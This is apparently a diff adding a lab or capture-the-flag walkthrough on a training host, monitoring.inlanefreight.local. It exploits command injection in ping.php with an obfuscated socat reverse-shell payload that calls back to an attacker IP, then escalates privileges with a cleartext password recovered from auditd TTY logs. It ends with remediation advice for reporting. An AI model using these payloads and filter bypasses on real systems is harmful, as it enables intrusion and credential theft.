@@ -48,3 +48,138 @@ cat /home/srvadm/flag.txt
 b447c27a00e3a348881b0030177000cd
 
 10. also type /bin/bash -i will spawn interactive shell once we switch to srvadm 
+
+
+GPT Breakdown : 
+
+🧱 Initial Access via Command Injection on monitoring.inlanefreight.local
+🗂️ Target
+lua
+Copy
+Edit
+monitoring.inlanefreight.local
+IP: 10.129.229.147
+🎯 Goal
+Get a reverse shell from RCE in ping.php
+
+Escalate from webdev to srvadm using recovered credentials from auditd logs
+
+Retrieve /home/srvadm/flag.txt
+
+🧠 Vulnerability Recap
+ping.php accepts an ip= parameter that gets passed unsafely to the shell via shell_exec() or similar
+
+Filter bypass using %0A (newline) and obfuscated shell payload
+
+Escalation via command logging in audit logs (aureport)
+
+🪜 Steps Taken
+🔧 1. Update /etc/hosts
+bash
+Copy
+Edit
+sudo nano /etc/hosts
+
+# Add:
+10.129.229.147    monitoring.inlanefreight.local
+🛰️ 2. Send Socat Reverse Shell via Burp
+http
+Copy
+Edit
+GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.15.252:8443${IFS}EXEC:bash HTTP/1.1
+Host: monitoring.inlanefreight.local
+...
+🎯 This payload bypasses filters using:
+
+Single quotes per character
+
+${IFS} (Internal Field Separator) as space bypass
+
+Obfuscated socat payload to spawn a TCP reverse shell
+
+🖥️ 3. Set Up Listener
+bash
+Copy
+Edit
+socat TCP4-LISTEN:8443,reuseaddr,fork EXEC:/bin/bash
+✅ Shell caught as webdev
+
+🛠️ 4. Upgrade Shell
+bash
+Copy
+Edit
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+Check your user:
+
+bash
+Copy
+Edit
+id
+# uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
+💡 You're in the adm group = interesting privilege access!
+
+📜 5. Review TTY Audit Logs for Commands & Password Leakage
+bash
+Copy
+Edit
+aureport --tty | less
+Key Finding:
+
+nginx
+Copy
+Edit
+su "ILFreightnixadm!"
+sudo su srvadm
+🚨 Found credential reuse in cleartext:
+
+makefile
+Copy
+Edit
+srvadm:ILFreightnixadm!
+🔑 6. Privilege Escalation
+bash
+Copy
+Edit
+su srvadm
+# Enter password: ILFreightnixadm!
+Confirm user switch:
+
+bash
+Copy
+Edit
+id
+# uid=1003(srvadm) gid=1003(srvadm)
+(optional)
+
+bash
+Copy
+Edit
+/bin/bash -i  # To spawn an interactive shell
+🏁 7. Retrieve the Flag
+bash
+Copy
+Edit
+cat /home/srvadm/flag.txt
+# Output: b447c27a00e3a348881b0030177000cd
+🧠 Real-World Takeaways
+Area	Key Insight
+RCE	Line feed %0A + obfuscated socat leads to reliable shell bypass
+Post-Ex	auditd logs can leak su/sudo commands with plaintext passwords
+Privilege Escalation	Exploiting lazy sudo history / command logging is a realistic path
+Shell Upgrade	Always run /bin/bash -i or pty.spawn() to avoid broken TTYs
+🛡️ Reporting Suggestions
+Command Injection in ping.php via unsanitized input
+
+Recommend:
+
+Input validation (regex match IP only)
+
+Disabling shell_exec() or system command usage
+
+Use of proper firewall/IDS monitoring for outbound shells
+
+Credential Leakage:
+
+Disable auditd TTY logging for password input or sanitize logs
+
+Audit and rotate reused credentials across users
